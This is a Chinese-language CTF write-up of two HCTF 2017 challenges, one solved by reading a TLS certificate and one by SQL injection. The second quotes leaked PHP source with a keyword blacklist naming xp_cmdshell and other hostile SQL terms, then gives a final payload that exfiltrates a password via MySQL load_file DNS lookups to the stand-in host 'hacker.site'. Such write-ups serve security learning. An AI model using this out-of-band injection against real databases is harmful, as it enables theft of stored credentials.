#easy_sign_in

>这个题目真的真的非常简单，连提示都非常的明显就是去查看证书的内容。
>从证书中我们可以得到一条flag in:   123.206.81.217  或许有些浏览器显示的位置不一定是这样. 打开123.206.81.217  就可以看到
>__*flag: hctf{s00000_e4sy_sign_in}*__




# HCTF2017-boring-website


首先扫目录发现有www.zip,下载并打开发现是源码

```php
<?php
echo "Bob received a mission to write a login system on someone else's serve
r, and he he only finished half of the work<br />";
echo "flag is hctf{what you get}<br /><br />";
error_reporting(E_ALL^E_NOTICE^E_WARNING);
try {
$conn = new PDO( "sqlsrv:Server=*****;Database=not_here","oob", "");
}
catch( PDOException $e ) {
die( "Error connecting to SQL Server".$e->getMessage() );
}
#echo "Connected to MySQL<br />";
echo "Connected to SQL Server<br />";
$id = $_GET['id'];
if(preg_match('/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare
|if|insert|into|outfile|dumpfile|sleep|wait|benchmark/i', $id)) {
die('NoNoNo');
}
$query = "select message from not_here_too where id = $id"; //link server: O
n linkname:mysql
$stmt = $conn->query( $query );
if ( @$row = $stmt->fetch( PDO::FETCH_ASSOC ) ){
//TO DO: ...
//It's time to sleep...
}
?>

```
发现应该是`sql server`用`linkserver`来连接`mysql`。所以去查了一波`linkserver`的用法，以及结合注释可得`select * from openquery(mysql,'select xxx')`可以从mysql数据库中查得信息，但是没有回显，sleep函数也被ban了，然后看到`oob`的提示，去查了一波`mysql out-of-band`，发现`load_file`函数可以通过dns通道把所查得的数据带出来。接下来的过程就是十分常见简单的mysql注入的流程。
最终的payload: `/?id=1 union select * from openquery(mysql,'select load_file(concat("\\\\",(select password from secret),".hacker.site\\a.txt"))')`

dnslog 平台可以自己搭也可以用ceye

[mysql out of band](http://www.mottoin.com/96463.html)
